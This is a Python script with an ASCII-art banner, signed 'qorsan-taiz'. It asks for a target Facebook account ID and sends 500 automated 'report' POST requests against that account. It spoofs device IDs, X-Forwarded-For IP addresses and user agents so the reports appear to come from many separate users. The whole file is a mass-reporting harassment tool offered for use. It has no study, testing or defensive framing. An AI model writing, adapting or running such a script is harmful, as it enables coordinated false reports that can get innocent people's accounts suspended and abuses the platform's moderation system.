#qorsan-taiz

import requests
import random
import time
import os
from colorama import Fore
Z =  '\033[1;31m' #red
F = '\033[2;30m' #رصاصي
B = '\033[2;36m'#سماوي
X = '\033[1;33m' #yello
C = '\033[2;34m'#بنفسجي
M = '\033[1;92m'#green
os.system('clear')
banner = Z+"""@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#BGGGGGPPPPPG#&@@@@@@@@@@B?P@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@&B#&&&#BB#####GPPGBBGGGB#&@@@@@@#?5&@&@@@@@@@@@@@@@@@@@@@@
@@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&BGB##&&&&&&&&@&GG#&&&#GPPGB#&&&&#?JB&&&&&&&&&&&&&&&&&&&&@@
@&&&&&&&&&&&&&&&&&&&&&&&#BGGGGGBBGGB####&##&&@@@@@@@@@@@@&#&@@@@&#BGPPGGGB#Y?P&&&&&&&&&&&&&&&&&&&&@@
@&&&&&&&&&&&&&&&&&&&&&#GPPPPPPPGGB##&&&&@@@&#BBGGGGGB#&@@@@@@@@@@@@&#BPPPPGY~Y#&&&&&&&&&&&&&&&&&&&&@
@&&&&&&&&&&&&&&&&&&&&&#BPPPGB##&&@@@@@@@&#GP5Y55555Y555P#@@@@@@@@@@@@&#GPPP5~?B&&BB#&&&&&&&&&&&&&&&@
@&&&&&&&&&&&&&&&&&&&&&&#GPB#&&@@@@@@@@@&G5YJ??J5GP5YYYYYYP&@@@@@@@@@@&BGPPGY:?G&#JYGP&&&&&&&&&&&&&&@
@&&&&&&&&&&&&&&&&&&&&&#BBB#&&@@@@@@@@@&G5Y?7!!7J5PP5YYYYY7Y#@@@@@@@@@57J5PBP?YP##5PBB&&&&&&&&&&&&&&@
@&&&&&&&&&&&&&&&&&&#BBGGB##&&@@@@@@@@@&PYJ7!~^^!7JYJ??J5PBGJB@@@@@@&@#7J55BB7!7#P?J5#&&&&&&#&&&&&&&@
@&&&&&&&&&&&&&&&&&BGGGGGB#&@@@@@@@@@@@#55Y7~~^:.:~777YG#@@@BY#@@@@5~Y&G!!!P&J~?#P?YG&&&&&&&GG&&&&&&@
&&&&&&&&&&&&&&&&&#GGGGBGB#&@@@@@@@@@@@&55YYPGBBGPPGPG&@@&&&BYJPBB#B!.J&G~!5&5!5&#5P#&&&&&&#PG&&&&&&@
&&&&&&&&&&&&&&&&&&&&###GB&@@@@@@@@@@@@@G55J&@@@@@@#PG#&G5Y5GGY?Y5YJ5?:5@G!5&Y?GB5JB&&&&B555B&&&&&&&@
&&&&&&&&&&&&&&&&&&&&&&#GB&@@@@@@@@@@@@@&GBJJB#G5J7?##G#5?J?P&JY5PB55GJY#@5JP?PG?~YB555Y5G##&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&#GG#&@@@@@@@@@@@@@@&#P57~7~~7!!!!?YYJ7?#Y?YYYPPBBGB#B5555P5YGG5PB#&&&&&&&&&&&&@
&&&&&&&&&&&&&&&&&&&&BGPPB&@@@@@@@@@@@@&&#55BYJJ5GPJ7J5YB#P5BGP7JY5YG@@&#BPPPPGBPYPGB&&&&&&&&&&&&&&&@
&&&&&&&&&&&&&&&&&&&&GPPPB&@@@@@@@@@@#GGGYY5YJGGG#GPG#B&@@@@G5?!#BYJJB@@@&GGBBGBGGBGB#&&&&&&&&&&&&&&@
&&&&&&&&&&&&#BBBBGPPPPPG#&@@@@@@@@&5YYPPYJ55?YGPYBBB@@@@@@@#PY75GG5JY&@@@@@&PGBB&BGBB#&&&&&&&&&&&&&@
&&&&&&&&&&BP5YYYYYJ??J??YPGB&@@@@@G7J55##GB#G5PG#YJ5GB#@@@&BPYJPP5GG5&@@@@&##@&&&GBBGBB#&&&&&&&&&&&@
&&&&&&&&&&G5Y5PPPPPPPPYYYYY?!5&&&@GY5PB#BPGGBGP55P5GP5PPPPGBG5JJ5GPPP&@@&#PBB&&B@##BGGB&&&&&&&&&&&&@
&&&&&&&&#YJJY5PPPPPP5GPGGGPJ~^7YP&&PGPB@GPGPYYPGP5Y5B#BG5JJPPPP#BYGPP&@@&#@@&&&#&&&#GG#&&&&&&&&&&&&@
&&&&&&&B5PB##BB###BGPPY5PP55YPPGB#@BPB#@G5GGPY??7JPP55PGG5YYPGPPPBGBP&@@@@@@@@&&&&&#BG#&&&&&&&&&&&&@
&&&&&&&&#B55YJPBGBBBB###&P?P&#G##B&@G##@#BG55PGP5YYYYJ55&@@BY?PBGB#GG&@@@@@@@@&######B&&&&&&&&&&&&&@
&&&&&&&&&###&&&#BGGG#&@@#5G&@@#G#&#&###&@#GG55PGPGPJ?JJYB@@#GGGYG#BGB@@@@@@@&#BGGB##&##&&&&&&&&&&&&@
@&&&&&&&&&&&&&&#GGGGB#&@&&@@@@@&##&##B&&@GGBPY5PGGGY?JYG@@@@&&&BPBGP&@@@@&#BGPPPGGB&&&&&&&&&&&&&&&&@
@@&&&&&&&&&&&&&&#B#BB#&&&@@@@@@@&##&#B#&@@@&&&&&&&#P77?5&@@@@@@@@&&#@@@&#GGPPPPPPGB&&&&&&&&&&&&&&&&@
@&&&&&&&&&&&&&&&&&&&&#####&@@@@@@@&#&##&@@@@@@@@&GGBJ?PG#@@@@@@@@@@@@@&BPPPPPPPPPG#&&&&&&&&&&&&&&&&@
&&&&&&&&&&&&&&&&&&&&&&&#BB#&&&@@@@@&@@&@@@@@@@@@@#B#GPBG#@@@@@@@@@@&&BGGPPPGBBBPPB&&&&&&&&&&&&&&&&&@
&&&&&&&&&&&&&&&&&&&&&&&&#BB######BBBB#&&&@@@@@@@&&#&&#&&&@@@@&&&###BBBGPPPG#&&&BPB&&&&&&&&&&&&&&&&&@
&&&&&&&&&&&&&&&&&&&&&&&&&#GPPPPPPPGGGGB####&&&##BBGGGGGGGGGGGGGGGGGGGGGGG#&&&&&BPB&&&&&&&&&&&&&&&&&@
&&&&&&&&&&&&&&&&&&&&&&&&&#GPGBBGGG#&&&&&&&##BBGGGPPGBBBBGGPPPBBGBB#&&&&&&&&&&&&#GB&&&&&&&&&&&&&&&&&@
&&&&&&&&&&&&&&&&&&&&&&&&&&BB&&&&#&&&&&&&&&#BB#BGPGB#&&&&&#BG#&&&&&&&&&&&&&&&&&&&#B&&&&&&&&&&&&&&&&&&
@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#B&&&#G#&&&&&&&#B#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&B#&&&&#&&&&&&&&#&&&&&&&&&&&&&&&&&&&&&&&&##&&&&&&##&&&&&&&@
@@@@@@@@@@@@@@@@&&&&@@@@@@&&@@@@@@@@@@@@@@&&@@@@@&@@@@@&&&&&@@@@@@@@@@@@@@@@@@@@&#PGPGGGGB5BPGPGGG#@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#&####B&#&#B##
by qorsan-taiz"""
print(banner)

# Enter the ID of the target Facebook account
account_id = input(X+"Enter the ID of the target Facebook account: ")

# Generate a list of fake device IDs, fake IP addresses, and fake user agents
devices = []
ips = []
user_agents = []
for i in range(500):
    device_id = ''.join(random.choices("0123456789abcdef", k=16))
    devices.append(device_id)
    ip_address = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    ips.append(ip_address)
    user_agent = f"Mozilla/5.0 (Windows NT {random.randint(5, 10)}.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.36 (KHTML, like Gecko) Chrome/{random.randint(60, 80)}.0.{random.randint(3000, 4000)}.{random.randint(100, 200)} Safari/{random.randint(500, 600)}.36"
    user_agents.append(user_agent)

# Set up the headers
headers = {
    "User-Agent": random.choice(user_agents),
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": f"https://www.facebook.com/{account_id}",
    "X-Forwarded-For": random.choice(ips)
}

# Send the report requests using the fake devices, IP addresses, and user agents
for device, ip, user_agent in zip(devices, ips, user_agents):
    data = {"device_id": device, "source": "profile", "reason": 1}
    headers["User-Agent"] = user_agent
    headers["X-Forwarded-For"] = ip
    response = requests.post(f"https://www.facebook.com/{account_id}/report", headers=headers, data=data)
    print(M+"(Report sent using device ID", device, "and IP address", ip, "with status code", response.status_code, '✅)')
    time.sleep(random.uniform(0.1, 0.5))
